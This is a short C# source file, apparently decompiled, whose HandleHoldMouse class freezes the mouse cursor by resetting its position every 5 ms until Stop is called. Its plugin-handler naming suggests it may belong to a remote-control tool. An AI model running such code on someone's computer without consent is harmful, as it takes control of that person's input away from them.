using System;
using System.Drawing;
using System.Timers;
using System.Windows.Forms;

namespace Plugin.Handler;

internal class HandleHoldMouse
{
	public static Timer timer;

	public static void Hold()
	{
		if (timer == null)
		{
			Point currentCursorPosition = Cursor.Position;
			timer = new Timer
			{
				Interval = 5.0
			};
			_ = DateTime.UtcNow;
			timer.Elapsed += delegate
			{
				Cursor.Position = currentCursorPosition;
			};
			timer.Start();
		}
	}

	public static void Stop()
	{
		if (timer != null)
		{
			timer.Stop();
			timer.Dispose();
		}
	}
}
